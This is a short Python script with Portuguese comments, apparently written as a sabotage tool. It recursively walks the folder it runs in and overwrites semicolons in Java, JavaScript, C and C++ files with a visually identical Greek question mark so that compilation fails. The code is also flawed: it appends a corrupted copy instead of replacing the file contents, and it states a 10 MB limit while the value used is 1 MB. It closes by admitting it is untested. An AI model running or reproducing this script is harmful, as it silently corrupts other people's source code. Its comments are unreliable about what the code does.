#FodCod.py - Substitui o caractere ';' nos arquivos de programacao java e c++ por um falso identico, causando erro ao tentar compilar os mesmos.

#Os arquivos de programacao sao enumerados recursivamente na pasta atual que este script esta sendo executado,
#existe um limite de 10 MB de suporte, arquivos de codigo maiores que isso sao ignorados
from os import stat,getcwd,walk,path

dirs=[getcwd()]

def fod(caminho):
    if stat(caminho).st_size<0x100000:#10 MB
        with open(caminho,'rb+') as cod:
            cod.write(cod.read().replace(b';',bytes.fromhex('cdbe')))

exts=('.java','.js','.c','.cpp','.h')
for dr in dirs:
    for d,sd,fls in walk(dr):
        for fl in fls:
            p=path.join(d,fl)
            for ext in exts:
                if fl.lower().endswith(ext):
                    fod(p)


#OBS: Nao testado, pode nao funcionar